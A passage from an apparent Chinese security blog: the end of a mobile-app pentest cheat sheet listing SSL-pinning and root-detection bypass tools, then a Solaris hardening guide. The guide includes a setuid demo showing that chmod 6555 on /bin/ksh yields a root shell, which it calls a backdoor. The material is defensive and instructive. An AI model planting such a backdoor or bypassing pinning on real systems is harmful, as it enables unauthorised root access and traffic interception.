<li>adb forward tcp:4444 tcp:4444</li>
<li>nc localhost 4444 | sudo Wireshark -k -S -i ?</li>
</ul>
</li>
</ul>
<p><a href="http://www.contextis.com/services/research/canape/" target="_blank" rel="external">Canape</a>  - 网络测试工具任意协议。<br><a href="https://intrepidusgroup.com/insight/mallory/" target="_blank" rel="external">Mallory</a>  -一个中间人工具，在移动设备上使用监视和操作和应用程序。<br><a href="https://portswigger.net/burp/download.html" target="_blank" rel="external">Burp Suite</a> - burp 一个集成的平台进行安全测试的应用程序。<br><a href="https://play.google.com/store/apps/details?id=org.proxydroid" target="_blank" rel="external">Proxydroid</a>  -为Android系统提供代理服务。</p>
<h4 id="u7ED5_u8FC7_u6839_u68C0_u6D4B_u548CSSL"><a href="#u7ED5_u8FC7_u6839_u68C0_u6D4B_u548CSSL" class="headerlink" title="绕过根检测和SSL"></a>绕过根检测和SSL</h4><p><a href="https://github.com/Fuzion24/JustTrustMe" target="_blank" rel="external">Xposed Module: Just Trust Me</a> - 绕过SSL证书锁定Xposed模块。<br><a href="https://github.com/ac-pm/SSLUnpinning_Xposed" target="_blank" rel="external">Xposed Module: SSLUnpinning</a> - Android Xposed模块绕过验证SSL证书(证书锁定)。<br><a href="https://github.com/iSECPartners/Android-SSL-TrustKiller" target="_blank" rel="external">Android SSL Trust Killer</a> - 黑箱工具可绕过长时间在设备上运行的应用程序的SSL证书。<br><a href="https://github.com/iSECPartners/android-ssl-bypass" target="_blank" rel="external">Android-ssl-bypass</a> -一个Android调试工具,可用于绕过SSL,即使证书将被实现,以及其他调试任务。该工具运行作为一个交互式控制台。<br><a href="https://github.com/devadvance/rootcloakplus" target="_blank" rel="external">RootCoak Plus</a> -防止应用程序检测root.</p>
<h4 id="u5B89_u5168_u5E93"><a href="#u5B89_u5168_u5E93" class="headerlink" title="安全库"></a>安全库</h4><p><a href="https://www.owasp.org/images/1/1f/Pubkey-pin-android.zip" target="_blank" rel="external">PublicKey Pinning </a>-将在Android X509TrustManager下通过一个定制的环境。X509TrustManager执行X509检查除了执行固定配置。<br><a href="https://github.com/moxie0/AndroidPinning" target="_blank" rel="external">Android Pinning</a>  - 是一个独立的库项目,促进了证书将SSL连接的Android应用程序,为了减少证书颁发机构的依赖。<br><a href="https://github.com/tozny/java-aes-crypto" target="_blank" rel="external">Java AES Crypto</a>  -一个简单的Android类加密与解密字符串,旨在避免经典错误,大多数患有这样的类。<br><a href="proguard.sourceforge.net">Proguard</a>  -收缩机混淆器是一个免费的Java类文件,优化器,模糊处理,并预先验证。它检测并删除未使用的类,字段,方法和属性。<br><a href="https://www.zetetic.net/sqlcipher/sqlcipher-for-android/" target="_blank" rel="external">SQL Cipher</a> -SQLCipher是一个开源扩展SQLite提供透明的256位aes加密的数据库文件。<br><a href="https://github.com/scottyab/secure-preferences" target="_blank" rel="external">Secure Preferences</a> -Android共享偏好包装比加密共享偏好的键和值。<br><a href="https://github.com/guardianproject/TrustedIntents" target="_blank" rel="external">Trusted Intents</a> - Android应用程序之间的交互灵活的信任库。</p>
<h5 id="u539F_u6587_u51FA_u5904"><a href="#u539F_u6587_u51FA_u5904" class="headerlink" title="原文出处"></a>原文出处</h5><ul>
<li><a href="https://github.com/tanprathan/MobileApp-Pentest-Cheatsheet#dynamic-and-runtime-analysis" target="_blank" rel="external">https://github.com/tanprathan/MobileApp-Pentest-Cheatsheet#dynamic-and-runtime-analysis</a></li>
<li><a href="https://www.peerlyst.com/posts/mobile-application-penetration-testing-cheat-sheet" target="_blank" rel="external">https://www.peerlyst.com/posts/mobile-application-penetration-testing-cheat-sheet</a></li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2016/03/02/移动应用渗透测试备忘单(一)/" data-id="cin5pv33h0002hcfwepz5zrg2" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-solaris" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2016/01/05/solaris/" class="article-date">
  <time datetime="2016-01-05T08:45:33.000Z" itemprop="datePublished">2016-01-05</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/01/05/solaris/">教你如何配置安全的SOLARIS系统</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="1-__u5E10_u53F7_u548C_u53E3_u4EE4_u5B89_u5168_u7B56_u7565"><a href="#1-__u5E10_u53F7_u548C_u53E3_u4EE4_u5B89_u5168_u7B56_u7565" class="headerlink" title="1.    帐号和口令安全策略"></a>1.    帐号和口令安全策略</h1><ul>
<li><p>1.1更改口令文件、影像文件、组文件的权限  </p>
<pre><code>/etc/passwd 必须所有用户都可读，root用户可写 –rw-r--r--
/etc/shadow 只有root可读 –r-------- 
/etc/group 必须所有用户都可读，root用户可写 –rw-r--r--
</code></pre></li>
<li><p>1.2修改不必要的系统帐号<br>移去或者锁定那些系统帐号，比如sys、uucp、nuucp、listen、lp、adm等等，简单的办法是在/etc/shadow的password域中放上NP字符。还可以考虑将/etc/passwd文件中的shell域设置成/bin/false  </p>
</li>
</ul>
<ul>
<li>1.3修改口令策略<br>  修改/etc/default/passwd文件  <pre><code>MAXWEEKS=4 口令至少每隔4星期更改一次  
MINWEEKS=1 口令至多每隔1星期更改一次  
WARNWEEKS=3 修改口令后第三个星期会收到快要修改口令的信息
PASSLENGTH=6 用户口令长度不少于6个字符 
</code></pre></li>
</ul>
<h1 id="2-__u7528_u6237_u6388_u6743_u5B89_u5168_u7B56_u7565"><a href="#2-__u7528_u6237_u6388_u6743_u5B89_u5168_u7B56_u7565" class="headerlink" title="2.    用户授权安全策略"></a>2.    用户授权安全策略</h1><ul>
<li>2.1移去组及其它用户对/etc的写权限。<br>  执行命令 <pre><code># chmod -R go-w /etc  
</code></pre></li>
<li>2.2禁止root远程登录<br>  在/etc/default/login中设置  <pre><code>CONSOLE=/dev/concle
</code></pre></li>
<li>2.3 setuid和setgid特殊权限。<br>  Setuid是指设置程序的有效执行用户身份(uid)为该文件的属主,而不是调用该程序进程的用户身份。Setgid与之类似。Setuid和setgid用1s -1显示出来为s权限,存在于主人和属组的执行权限的位置上。系统设置特殊权限，使用户执行某些命令时,具有root的执行权限, 命令执行完成, root身份也随之消失。因此特殊权限关系系统的安全，可执行命令:<pre><code># find / -perm -4000 -print 
</code></pre>  寻找系统中具有setuid权限的文件，存为列表文件，定时检查有没有这之外的文件被设置了setuid权限。  </li>
<li>2.4审计并日志所有以root身份的登陆情况<br>添加或编辑/etc/default/login文件如下：  <pre><code>SYSLOG= YES  
</code></pre>  syslog记录root的登陆失败，成功的情况。 </li>
<li>2.5设置远程登陆会话超时时间<br>   添加或编辑/etc/default/login文件如下：  <pre><code>TIMEOUT= 300  
</code></pre></li>
<li>2.6确定登陆需要密码验证<br>  添加或编辑/etc/default/login文件如下：  <pre><code>PASSREQ= YES 
</code></pre></li>
<li>2.7 UMASK设置<br>  umask命令设置用户文件和目录的文件创建缺省屏蔽值,若将此命令放入.profile文件,就可控制该用户后续所建文件的存取许可.umask命令与chmod命令的作用正好相反,它告诉系统在创建文件时不给予什么存取许可.<br>安装配置完操作系统之后确认root的umask设置是077或者027，执行:  <figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/umask <span class="string">[-S]</span> 确认。</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>2.7.1增加或修改/etc/default/login文件中如下行<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UMASK=<span class="number">027</span></span><br></pre></td></tr></table></figure></p>
<p>2.7.2并增加上行到如下的文件中：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/etc/<span class="class">.login</span> </span><br><span class="line">/etc/<span class="class">.profile</span> </span><br><span class="line">/etc/skel/local<span class="class">.cshre</span>  </span><br><span class="line">/etc/skel/local<span class="class">.login</span> </span><br><span class="line">/etc/skel/local.profile</span><br></pre></td></tr></table></figure></p>
<ul>
<li>2.8用户环境配置文件的PATH或者LD_LIBRARY_PATH中移去“.”<br>  从如下的文件中移走”.”,确认root的PATH环境变量设置是安全的，应该只包含/usr/bin:/sbin:/usr/sbin，避免当前工作目录.出现在PATH环境变量中，这有助于对抗特洛伊木马。<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#echo $PATH | grep <span class="string">":."</span> 确认 </span></span><br><span class="line">/.login </span><br><span class="line">/etc/.login 　　　 </span><br><span class="line">/etc/<span class="keyword">default</span>/login 　 </span><br><span class="line">/.cshrc </span><br><span class="line">/etc/skel/<span class="keyword">local</span>.profile </span><br><span class="line">/etc/skel/<span class="keyword">local</span>.cshrc </span><br><span class="line">/.profile　</span><br><span class="line">/etc/skel/<span class="keyword">local</span>.login </span><br><span class="line">/etc/profile</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h1 id="3-__u7F51_u7EDC_u4E0E_u670D_u52A1_u5B89_u5168_u7B56_u7565"><a href="#3-__u7F51_u7EDC_u4E0E_u670D_u52A1_u5B89_u5168_u7B56_u7565" class="headerlink" title="3.    网络与服务安全策略"></a>3.    网络与服务安全策略</h1><ul>
<li>3.1关闭不用的服务<br>3.1.1在inetd.conf中关闭不用的服务<br>首先复制/etc/inet/inetd.conf。 <pre><code># cp /etc/inet/inetd.conf /etc/inet/inetd.conf.backup
</code></pre>然后用vi编辑器编辑inetd.conf文件，对于需要注释掉的服务在相应行开头标记“#”字符即可。<br>3.1.2在Services中关闭不用的服务<br>首先复制/etc/inet/services。 <pre><code># cp /etc/inet/services /etc/inet/services.backup 
</code></pre>然后用vi编辑器编辑Services文件，对于需要注释掉的服务在相应行开头标记“#”字符即可。 在inetd.conf、services中进行修改后，找到inetd进程的ID号，用kill向其发送HUP信号进行刷新。举例如下。 <pre><code># ps -ef | grep inetd  
# kill -HUP 进程号 或/usr/sbin/inetd –s –t  
</code></pre>增加-t选项以加强网络访问控制<br>3.1.3根据需要关闭不用的服务<br>  可关闭如下服务：tftp、ypupdate(NIS程序)、 dtspcd(邮件收发程序) 、rquotad、name、uucp(网络实用系统)、snmp(简单网络管理协议)等。</li>
<li>3.2关闭系统的自启动服务<br>在系统/etc/rc*.d的目录下，根据需要停用以下服务:  <pre><code>sendmail 把/etc/rc2.d/S88sendmai更名为tc/rc2.d/X88sendmail  
DNS 将/etc/rc2.d/S72inetsv注释掉in.named一项  
lp 把/etc/rc2.d/S80lp更名为 /etc/rc2.d/X80lp  
uucp 把/etc/rc2.d/S70uucp更名为/etc/rc2.d/x70uucp  
snmp把/etc/rc3.d/S76snmpdx和 /etc/rc3.d/S77dmi 更名 为/etc/rc3.d/s76snmpdx和/etc/rc3.d/s77dmi  
autoinstall 把/etc/rc2.d/S72autoinstallg更名为/etc/rc2.d/s72autoinstall  
</code></pre></li>
<li>3.3加强FTP服务安全<br>3.3.1禁止系统用户的FTP服务<br>把所有的系统账户加入到/etc/ftpusers(solaris 9的该文件现更改为/etc/ftpd/ftpusers)文件：<pre><code>root 、daemon、sys、bin、adm、lp、uucp、nuucp、listen、nobody  
</code></pre>3.3.2禁止FTP&amp;服务暴露系统敏感信息<br>   编辑/etc/default/ftpd文件，假如文件不存在就新建一个，在文件中的加进入下一项：    BANNER=XXXX(XXXX可以任意改变为任何一个版本信息)，将该系统版本信息屏蔽.<br>3.3.3ftp服务会话日志记录  <pre><code>/etc/inet/inetd.conf中的ftpd为（记录）  
ftp stream tcp nowait root /usr/sbin/in.ftpd in.ftpd –dl  
</code></pre></li>
<li>3.4加强Telnet服务安全<br>3.4.1禁止Telnet服务暴露系统敏感信息<br>  防止telnetd banner泄露信息 ，修改/etc/default/telnetd文件 ，加入以下一项：<pre><code>BANNER=XXXX
</code></pre>  (XXXX可以任意改变为任何一个版本信息)，将该系统版本信息屏蔽.<br>3.4.2更改Telnet服务端口号<br>  修改文件/etc/services的Telnet一项，将端口号改为非23，使用Telnet服务时需注明端口号。</li>
<li>3.5加强NFS服务安全<br>检查/etc/dfs/dfstab文件share语句，缺省时共享目录为可读可写，加入“-o”选项增加安全，“-o rw”可读可写，“-o ro”只读，可授权某系统和某用户。  </li>
<li>3.6防止TCP序列号预测攻击(ip欺骗)<br>在/etc/default/inetinit中增加设置来防止TCP序列号预测攻击(ip欺骗)<pre><code>TCP_STRONG_ISS=2  
</code></pre></li>
<li>3.7系统路由安全<br>  如果Solaris机器有超过一块的网卡的话，它将会在不同网卡间转发数据包，这一行为可以在/etc/init.d/inetinit中得到控制。要在Solaris 2.4或者更低版本机器下关闭它，可以将:<pre><code>ndd -set /dev/ip ip_forwarding 0
</code></pre>  添加于在inetinit文件未尾。在Solaris 2.5以上，只要touch /etc/notrouter.网络系统用静态路由比较安全。</li>
<li>3.8调整网络参数，加强网络安全<br>使IP forwarding和sourec routing(源路)由无效<br>在Inetinit中使IP forwarding和sourec routing(源路)由无效(假如有超过一个网络接口的话)。在/etc/init.d/inetinit中增加下面所示设置:<br>  禁止系统转发定向广播包 <pre><code># ndd -set /dev/ip ip_forward_directed_broadcasts 0 
</code></pre>  关闭原路由寻址 ：<pre><code># ndd -set /dev/ip ip_forward_src_routed 0 
</code></pre>禁止系统转发IP包：#ndd -set /dev/ip ip_forwarding 0<br>缩短ARP的cache保存时间: (default is 5 min)  <pre><code># ndd -set /dev/arp arp_cleanup_interval 2 
</code></pre>关闭echo广播来防止ping攻击（ # default is 1 ）<pre><code># ndd -set /dev/ip ip_respond_to_echo_broadcast 0 
</code></pre></li>
</ul>
<h1 id="4-__u9632_u6B62_u5806_u6808_u7F13_u51B2_u76CA_u51FA_u5B89_u5168_u7B56_u7565"><a href="#4-__u9632_u6B62_u5806_u6808_u7F13_u51B2_u76CA_u51FA_u5B89_u5168_u7B56_u7565" class="headerlink" title="4.    防止堆栈缓冲益出安全策略"></a>4.    防止堆栈缓冲益出安全策略</h1><p>入侵者常常使用的一种利用系统漏洞的方式是堆栈溢出，他们在堆栈里巧妙地插入一段代码，利用它们的溢出来执行，以获得对系统的某种权限。要让你的系统在堆栈缓冲溢出攻击中更不易受侵害，你可以在/etc/system里加上如下语句:<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> noexec_user_stack=<span class="number">1</span> </span><br><span class="line"><span class="built_in">set</span> noexec_user_stack_log =<span class="number">1</span></span><br></pre></td></tr></table></figure></p>
<p>第一句可以防止在堆栈中执行插入的代码，第二句则是在入侵者想运行exploit的时候会做记录。</p>
<h1 id="5-__u65E5_u5FD7_u7CFB_u7EDF_u5B89_u5168_u7B56_u7565"><a href="#5-__u65E5_u5FD7_u7CFB_u7EDF_u5B89_u5168_u7B56_u7565" class="headerlink" title="5.    日志系统安全策略"></a>5.    日志系统安全策略</h1><ul>
<li><p>5.1定时检查系统日志文件<br>  Solaris系统通过syslogd进程运行日志系统，配置文件/etc/syslog.conf，可编辑此文件让日志系统记录更多信息，需重启/usr/sbin/syslogd进程，重读取配置文件。通常日志系统的文件分别存放在两个位置，/var/adm保存本地系统日志，/var/log保存登录其它系统时日志。</p>
</li>
<li><p>5.2设置utmpx和wtmpx文件权限，确保日志系统安全<br>  文件/var/adm/utmpx记录了所有当前登录到系统中的用户，文件/var/adm/wtmpx记录了系统所有的登录和注销。这两个文件是以数据库的格式存在的。<br>设置权限</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#chmod <span class="number">544</span> /var/adm/utmpx </span></span><br><span class="line"><span class="preprocessor">#chmod <span class="number">544</span> /var/adm/wtmpx</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h1 id="6-__u5176_u5B83_u7CFB_u7EDF_u5B89_u5168_u8BBE_u7F6E"><a href="#6-__u5176_u5B83_u7CFB_u7EDF_u5B89_u5168_u8BBE_u7F6E" class="headerlink" title="6.    其它系统安全设置"></a>6.    其它系统安全设置</h1><ul>
<li>6.1 crontab命令<br>6.1.1不要使用crontab –e命令，因为它会在/tmp下建立所有用户都可读的crontab副本访问cron系统。用如下的方法：<br>编辑文件：mycronfile <pre><code>crontab&lt;mycronfile 
</code></pre>6.1.2在/etc/default/cron文件中增加如下行：<pre><code>CRONLOG=YES   #记录所有的crontab行为
</code></pre></li>
<li><p>6.2对su的纪录<br>创建/etc/default/su文件 </p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SULOG=<span class="regexp">/var/</span>adm/sulog  </span><br><span class="line">SYSLOG=YES  </span><br><span class="line">CONSOLE=<span class="regexp">/dev/</span>console </span><br><span class="line">PATH=<span class="regexp">/usr/</span><span class="string">bin:</span>  </span><br><span class="line">SUPATH=<span class="regexp">/usr/</span><span class="string">sbin:</span><span class="regexp">/usr/</span>bin</span><br></pre></td></tr></table></figure>
</li>
<li><p>6.3为OpenBoot设置密码<br>在Solaris中设置密码  </p>
<pre><code>#eeprom security-password  
</code></pre><p>在OpenBoot中设置密码  </p>
<pre><code>ok password  
</code></pre><p>在Solaris中设置安全级别（command）  </p>
<pre><code>#eeprom security-mode=command  
</code></pre><p>在OpenBoot中设置安全级别（command）  </p>
<pre><code>ok setenv security-mode command  
</code></pre><p>在OpenBoot中设置安全级别（full）  </p>
<pre><code>ok setenv security-mode full  
</code></pre></li>
<li>6.4限制.rhosts和/etc/hosts.equiv文件的使用<br>  配置文件具有两种功能：r系列命令使用这些文件来访问系统;在某用户的目录下存在.rhosts文件或/etc/hosts.equiv文件配有某系统，任何用户都可以通过rlogin不需要口令以该用户的身份登录到系统。因此要为这些文件加锁，先创建它们，然后修改其属性为零即可。这样除了root用户就没有其它用户能创建或修改它们了。  <pre><code>/usr/bin/touch　　　/.rhosts　/etc/hosts.equiv  
/usr/bin/chmod　0　/.rhosts　/etc/hosts.equiv  
</code></pre>.rhosts文件可以作为一个典型的后门文件使用，运行下面的命令全局查找.rhosts文件  <pre><code>#find -name“.rhosts”-print 
</code></pre></li>
<li>6.5给系统打补丁<br>  象其它的系统一样，Solaris系统也有它的漏洞，其中的一些从性质上来说是相当严重的。SUN公司长期向客户提供各种版本的最新补丁，放在<a href="http://sunsolve.sun.com" target="_blank" rel="external">http://sunsolve.sun.com</a> 网站。可用:<pre><code># showrev –p
</code></pre>  命令检查系统已打的补丁或到/var/sadm/patch目录下查已打过的补丁号，用patchadd命令给系统打补丁。  <h1 id="7-_Setuid_u8BBE_u7F6E_u548CSolaris_u64CD_u4F5C_u7CFB_u7EDF_u5B89_u5168"><a href="#7-_Setuid_u8BBE_u7F6E_u548CSolaris_u64CD_u4F5C_u7CFB_u7EDF_u5B89_u5168" class="headerlink" title="7.    Setuid设置和Solaris操作系统安全"></a>7.    Setuid设置和Solaris操作系统安全</h1>在Solaris中,文件除了读、写、执行权限外，还有一些特殊权限。 Setuid和setgid是其中的一类。它与Solaris系统的安全关系紧密。<br>Setuid是指设置程序的有效的执行用户身份（uid）为该文件的主人，而不是调用该程序的进程的uid。Setgid与之类似。Setuid和setgid用ls –l显示出来为s权限，存在于主人和属组的执行权限的位置上。<br>这种权限的设置方法如下：  <pre><code>只设setuid： chmod 4xxx filename (xxx为一般读、写、执行权限)  
只设setgid： chmod 2xxx filename  
同时设setuid和setgid： chmod 6xxx filename  
取消两种权限： chmod 0xxx filename  
</code></pre>这种权限怎么用？<br>举个例子来说，假如某一命令（程序）的主人是root用户，并且该文件有setuid属性，但是该文件的读、写、执行权限的属性表明普通用户user1可以执行该命令，那么就表示：当该用户执行该命令时，他具有root的执行身份，并获得相应的权限。一旦该命令执行完成，该身份也随之消失。<br>  为什么系统中需要有这样的权限呢？请执行以下操作：  </li>
<li><p>7.1. </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ls –l /etc/shadow /bin/passwd  </span><br><span class="line">-r-sr-sr-x <span class="number">3</span> root sys <span class="number">99792</span> <span class="number">1999</span> <span class="number">2</span>月 <span class="number">12</span> /bin/passwd  </span><br><span class="line">-r-------- <span class="number">1</span> root sys <span class="number">261</span> <span class="number">1</span>月 <span class="number">3</span> <span class="number">13</span>：<span class="number">12</span> /etc/shadow</span><br></pre></td></tr></table></figure>
<p>  /etc/shadow文件由于存有用户的加密口令信息，对系统的安全至关重要，因此权限很严，只有root凭其对系统的至高无上的权限才得以对/etc/shadow可读可写。但是系统必须允许普通用户也能修改自己的口令。要让他们对/etc/shadow可写，又不能可读，而且可写又不能允许他们改别人的口令，怎么办？系统就采取这样一个办法：做一个程序， 也就是/bin/passwd，通过它可以在不显示文件内容的情况下直接修改/etc/shadow文件。可是这个程序怎么能有这样的权限？因为系统赋予它setuid权限，而且它属于root.这样，用户在使用/bin/passwd改口令时就有root权限.由于/bin/passwd命令本身功能的局限性，用户并不能用它做更多的不利于系统安全的事。  </p>
</li>
<li><p>7.2. 用普通用户身份修改口令  </p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ passwd </span><br><span class="line">Enter login password: <span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span>  </span><br><span class="line">New password:<span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span>  </span><br><span class="line">Re-enter new password:<span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span>  </span><br><span class="line">Passwd(SYSTEM): passwd successfully changed for xxx .</span><br></pre></td></tr></table></figure>
<p>  可以成功。  </p>
</li>
<li>7.3. 用超级用户修改/bin/passwd的权限  <pre><code>#chmod 0555 /bin/passwd  
</code></pre></li>
<li>7.4. 再重复2，是否还成功？当然不。  </li>
<li>7.5．把/bin/passwd的权限恢复原状。  <pre><code>#chmod 6555 /bin/passwd  
</code></pre>  对此可以打一个生动的比喻：有一个绝密机关，不得已必须有一些不能见这些秘密的人进来做一些事情。于是授权一些特殊的“车辆”（没有窗户，门紧闭，所以看不到外面。只有一个小洞允许乘坐的人伸出一只手臂），带着所乘坐的人开到要去的地方，允许它办完事情马上带他出来。这样是不是很安全？不一定。如果“车辆”没有经过精挑细选是有很多“门窗”，那系统可就危险了。<br>  这种安全威胁在Solaris中也有可能出现。比如做一下下面这个实验：  </li>
<li><p>7.6. </p>
<pre><code>$ vi /etc/shadow  
/etc/shadow: Permission denied.  
</code></pre><p>7.7. 用超级用户身份  </p>
<pre><code>#chmod 6555 /bin/vi  
#chown root /bin/vi  
</code></pre><p>7.8. 这次再用普通用户身份试一试第6步，有什么结果？这次你能以普通用户身份修改         /etc/shadow了！！但是  $ more /etc/shadow仍然不成功，说明在执行/bin/passwd时有超级用户权限，平时仍是普通用户身份。<br>再来看一个令人不安的情况：<br>7.9．用超级用户身份  </p>
<pre><code>#chmod 6555 /bin/ksh  
#chown root /bin/ksh  
</code></pre><p>7.10. 用普通用户身份 </p>
<pre><code>$ ksh  
#  
</code></pre><p>发生了什么情况？？普通用户不需要root口令就变成了root！！！<br> 好可怕。如果有一个用户曾有一次获得超级用户权限，并通过类似的方式给自己设置了后门（也可能放了一个类似的文件在他自己的家目录中），以后他就可以随时变成超级用户了。<br>怎么能避免setuid的不安全影响，又利用其方便的地方？这里有几点建议：<br>关键目录应严格控制写权限。比如/，/usr等。<br>  对不管是root帐号还是普通用户帐号的保密都有足够的重视。最好不要设置类似于guest、public、test之类公用的容易猜出口令的帐号。<br>  对系统中应该具有setuid权限的文件作一列表，定时检查有没有这之外的文件被设置了setuid权限。<br>  下面有一个自己编的小程序与大家分享。<br>  程序功能描述：检查有没有/usr/secu/masterlist文件记录之外的其它文件被设置了setuid权限<br>事先要求：在系统调试完成，所有需要安装的软件安装好以后，执行下面命令生成检查对照文件  </p>
<pre><code>#mkdir –p /usr/secu  
#find / -perm –4000 –print &gt;; /usr/secu/masterlist  
</code></pre><p>  程序：  </p>
<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp  </span><br><span class="line">   [ -f secrcheck ] &amp;&amp; rm secrcheck find / -perm -<span class="number">4000</span> -print &gt;;secrcheck <span class="keyword">for</span> f <span class="keyword">in</span> `cat secrcheck` do grep -w <span class="variable">$f</span> /usr/secu/masterlist &gt;;/dev/null <span class="keyword">if</span> [ <span class="string">"$?"</span> != <span class="string">"0"</span> ]; <span class="keyword">then</span> echo <span class="variable">$f</span> is not <span class="keyword">in</span> list  </span><br><span class="line">   fi done  </span><br><span class="line">   rm secrcheck</span><br></pre></td></tr></table></figure>
<p>  在需要对系统做检查时，执行本shell程序。也可以放在定时进程中定时检查。程序由于需要在整个文件系统中做查找操作，需要比较长的时间。 </p>
</li>
</ul>
<h1 id="8-_Solaris_u7CFB_u7EDF_u5B89_u5168_u4E4B_u5BA1_u8BA1"><a href="#8-_Solaris_u7CFB_u7EDF_u5B89_u5168_u4E4B_u5BA1_u8BA1" class="headerlink" title="8.    Solaris系统安全之审计"></a>8.    Solaris系统安全之审计</h1><p>作为C2安全等级操作系统（公安部二级），Solaris最主要的安全功能之一就是审计功能，本文将简单介绍Solaris审计功能的使用和启动。<br>目的：纪录系统和用户事件，并对审计过程自身进行保护。这里值得注意的就是纪录事件的细度。Solaris提供了很强大的审计功能，甚至可以纪录每一条调试信息，但是这样做是不明智的，因为很多信息对用户没用，而且会使系统性能下降。审计细度需要管理员根据用途和需要自行订制。<br>实现：  </p>
<ul>
<li>8.1     查看日志<br>1)    history文件<br>通常在根目录下，隐藏文件，记录了root执行的命令<br>2)    /var/adm <pre><code>messages：记载来自系统核心的各种运行日志，可以记载的内容是由/etc/syslog.conf决定的  
sulog：记载着普通用户尝试su成为其它用户的纪录。它的格式为： 发生时间 +/-(成功/失败) pts号  
utmpx：这两个文件是不具可读性的，它们记录着当前登录在主机上的用户，管理员可以用w，who等命令来看  
wtmpx：相当于历史纪录，记录着所有登录过主机的用户，时间，来源等内容，可用last命令来看  
</code></pre>3)    /var/log<br>syslog文件，这个文件的内容一般是纪录mail事件的  </li>
<li><p>8.2     syslog<br>1) 实时错误检查：  </p>
<pre><code>tail –f /var/adm/messages  
</code></pre><p>  -f在监视器上允许看见每条记录 /var/adm/messages记录事件路径<br>2) /etc/syslog.conf语法：  </p>
<pre><code>*.err;kern.debug;deamon.notice;mail.crit /var/adm/messages  
</code></pre><p>工具认可的值  </p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">值 描述  </span><br><span class="line">   user 用户进程产生的消息。这是来自没有在文件列表中的设备的消息的默认优先级  </span><br><span class="line">   kern 由内核产生的消息  </span><br><span class="line">   mail 邮件系统  </span><br><span class="line">   daemon 系统守护进程  </span><br><span class="line">   auth 授权系统，如login、<span class="keyword">su</span>  </span><br><span class="line">   lpr 行式打印机假脱机系统  </span><br><span class="line">   <span class="keyword">news</span> 网络新闻系统USENET保留值  </span><br><span class="line">   uucp 为UUCP系统保留值，目前UUCP不使用syslog机制  </span><br><span class="line">   cron Cron/at工具；crontab、at、cron  </span><br><span class="line">   local0-7 为本地使用保留  </span><br><span class="line">   <span class="keyword">mark</span> 内部用于由syslog产生的时间戳消息  </span><br><span class="line"><span class="comment">   * 除标记工具之外的所有工具级别认可的值（按重要性降序排列）  </span></span><br><span class="line">   emerg 用于通常必须广播给所有用户的恐慌情况  </span><br><span class="line">   alert 必须立即被修正的情况，例如被损坏的系统数据库  </span><br><span class="line">   crit 用户对关键情况的告警，例如设备错误  </span><br><span class="line">   <span class="keyword">err</span> 用于其他错误  </span><br><span class="line">   warning 用于所有的警告信息  </span><br><span class="line">   notice 用于没有错误但是可能需要特别处理的情况。  </span><br><span class="line">   info 通知消息  </span><br><span class="line">   debug 用于通常只在调试时才使用的消息  </span><br><span class="line">   none 不发送从指出的设备发来的消息到选定文件中</span><br></pre></td></tr></table></figure>
<p>  3) 例如如果要纪录登录信息（telnet），可以这样做：  </p>
<pre><code>/etc/default/login中：SYSLOG=YES  
/etc/syslog.conf中添加：auth.notice /export/home/wangyu/log  
